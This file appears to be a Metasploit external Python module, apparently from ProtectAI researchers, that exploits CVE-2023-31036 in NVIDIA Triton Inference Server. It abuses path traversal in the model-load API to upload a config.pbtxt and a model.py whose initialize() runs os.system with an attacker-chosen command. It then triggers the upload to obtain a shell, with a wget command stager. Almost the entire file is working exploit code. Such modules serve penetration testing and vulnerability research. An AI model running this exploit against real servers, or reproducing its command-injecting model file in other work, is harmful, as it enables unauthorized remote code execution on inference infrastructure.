#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-python-modules.html

# standard modules
import logging
import base64
import random

# extra modules
dependencies_missing = False
try:
    import requests
    from requests import Session
except ImportError:
    dependencies_missing = True

from metasploit import module

metadata = {
    'name': 'Triton Inference Server RCE through Python backend model upload',
    'description': '''
        When the Triton Inference Server is started with `--model-control-mode explicit` argument, an attacker is able to overwrite arbitrary files on the server.
        This leads to RCE as Triton has a Python backend that can execute arbitrary Python files.

        This module requires the MeterpreterTryToFork to be true.
    ''',

    'authors': [
        'l1k3beef', # Vuln Discovery
        'byt3bl33d3r <marcello@protectai.com>', # MSF Module
        'danmcinerney <dan@protectai.com>' # MSF Module
    ],

    'rank': 'excellent',
    'date': '2023-11-15',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://huntr.com/bounties/b27148e3-4da4-4e12-95ae-756d33d94687/'},
        {'type': 'cve', 'ref': 'CVE-2023-31036'}
    ],
    'type': 'remote_exploit_cmd_stager',
    'targets': [
        {'platform': 'linux', 'arch': 'aarch64'},
        {'platform': 'linux', 'arch': 'x64'},
        {'platform': 'linux', 'arch': 'x86'}
    ],
    'default_options': {
        'MeterpreterTryToFork': True
    },
    'payload': {
        'command_stager_flavor': 'wget'
    },
    'options': {
        'command': {'type': 'string', 'description': 'The command to execute', 'required': True, 'default': "touch /tmp/metasploit"},
        'modelname': {'type': 'string', 'description': 'The name of the model to upload', 'required': True, 'default': "metasploit"},
        'overwrite': {'type': 'bool', 'description': 'Overwrite existing model instead of creating a new one via path traversal', 'required': True, 'default': False},
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'rport': {'type': 'port', 'description': 'Target port (TCP)', 'required': True, 'default': 8000},
        'ssl': {'type': 'bool', 'description': 'Negotiate SSL/TLS for outgoing connections', 'required': True, 'default': False}
    }
}

MODEL_CONFIG = '''
name: "MODEL_NAME"
backend: "python"

input [
  {
    name: "input__0"
    data_type: TYPE_FP32
    dims: [ -1, 3 ]
  }
]

output [
  {
    name: "output__0"
    data_type: TYPE_FP32
    dims: [ -1, 1 ]
  }
]

instance_group [
  {
    count: 1
    kind: KIND_CPU
  }
]

parameters [
  {
    key: "INFERENCE_MODE"
    value: { string_value: "true" }
  }
]
'''

PYTHON_MODEL = '''
import os

class TritonPythonModel:

    def initialize(self, args):
        os.system("PAYLOAD_HERE")

    def execute(self, requests):
        return

    def finalize(self):
        return
'''

def convert_args_to_correct_type(args):
    '''
    Utility function to correctly "cast" the modules options to their correct types according to the options.

    When a module is run using msfconsole, the module args are all passed as strings
    so we need to convert them manually. I'd use pydantic but want to avoid extra deps.
    '''

    corrected_args = {}

    for k,v in args.items():
        option_to_convert = metadata['options'].get(k)
        if option_to_convert:
            type_to_convert = metadata['options'][k]['type']
            if type_to_convert == 'bool':
                if isinstance(v, str):
                    if v.lower() == 'false':
                        corrected_args[k] = False
                    elif v.lower() == 'true':
                        corrected_args[k] = True

            if type_to_convert == 'port':
                corrected_args[k] = int(v)

    return {**args, **corrected_args}

def run(args):
    args = convert_args_to_correct_type(args)

    module.LogHandler.setup(msg_prefix=f"{args['rhost']} - ")

    logging.debug(args)
    if dependencies_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return

    base_url = f"{'https' if args['ssl'] else 'http'}://{args['rhost']}:{args['rport']}"

    s = Session()

    model_name = args['modelname']
    model_repo_path = ""

    if args['overwrite']:
        logging.info("Getting list of model repositories")

        r = s.post(f"{base_url}/v2/repository/index")
        try:
            model_name = random.choice(r.json())['name']
        except IndexError:
            logging.error("No models found on server. Exploit cannot continue")
            return

        logging.info(f"Will be overwriting config of model '{model_name}'")
    else:
        model_repo_path = f"../../models/{model_name}/"

    logging.info("Attempting to unload model (1/3)")
    s.post(f"{base_url}/v2/repository/models/{model_name}/unload")

    logging.info("Creating model repo layout: uploading model config (2/3)")
    s.post(
        f"{base_url}/v2/repository/models/{model_name}/load",
        json={ "parameters" : {
            "config" : "{}",
            f"file:{model_repo_path}config.pbtxt": base64.b64encode(
                MODEL_CONFIG.replace("MODEL_NAME", model_name).encode()
            ).decode()
            }
        }
    )

    logging.info("Creating model repo layout: uploading model.py (3/3)")
    r = s.post(
        f"{base_url}/v2/repository/models/{model_name}/load",
        json={ "parameters" : {
            "config" : "{}",
            f"file:{model_repo_path}1/model.py": base64.b64encode(
                PYTHON_MODEL.replace("PAYLOAD_HERE", args["command"]).encode()
            ).decode()
            }
        }
    )

    if not args['overwrite']:
        logging.info("Loading model to trigger payload")
        r = s.post(f"{base_url}/v2/repository/models/{model_name}/load")

    if r.status_code == 200:
        logging.info(f"Model load complete, you should get a shell. Status: {r.status_code}")
        logging.debug(r.text)
    else:
        logging.error(f"Exploit failed, model load was not successful. Status: {r.status_code}")
        logging.debug(r.text)

if __name__ == '__main__':
    module.run(metadata, run)
